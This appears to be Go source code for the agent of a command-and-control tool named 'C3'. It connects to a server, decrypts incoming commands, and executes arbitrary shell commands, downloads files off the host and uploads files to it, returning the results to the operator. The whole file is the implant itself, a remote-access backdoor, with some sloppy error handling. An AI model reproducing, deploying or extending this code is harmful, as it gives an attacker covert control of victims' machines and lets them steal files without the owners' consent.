package main

import (
	// Standard
	"encoding/gob"
	"net"
	"os/exec"
	"runtime"
	"strings"

	// C3
	"github.com/calebmatsick/C3/pkg/security"
	"github.com/calebmatsick/C3/pkg/transfer"
)


func main() {
	conn, err := net.Dial("tcp", "localhost:8080")

	encCmd := []byte("")
	dec := gob.NewDecoder(conn)
	enc := gob.NewEncoder(conn)

	if err != nil {
		enc.Encode(err)
	}

	cmdLoop:for {
		dec.Decode(&encCmd)
		cmd := security.Decrypt(encCmd)
		cmd = strings.TrimSuffix(cmd, "\n")
	
		switch {
		case cmd == "close":
			continue
		case cmd == "exit":
			break cmdLoop
		case cmd == "sysinfo":
			osType := runtime.GOOS
			enc.Encode(osType)
		case cmd == "download":
			encFilePath := []byte("")

			dec.Decode(&encFilePath)
			filePath := security.Decrypt(encFilePath)

			transfer.SendFile(conn, filePath)
		case cmd == "upload":
			transfer.RecieveFile(conn)
		default:
			cmdSlice := []string{cmd}
			out, err := exec.Command(cmdSlice[0], cmdSlice[1:]...).Output()
		
			if err != nil {
				enc.Encode(err)
			}

			output := string(out[:])
			enc.Encode(output)
		}	
	}
	conn.Close()
}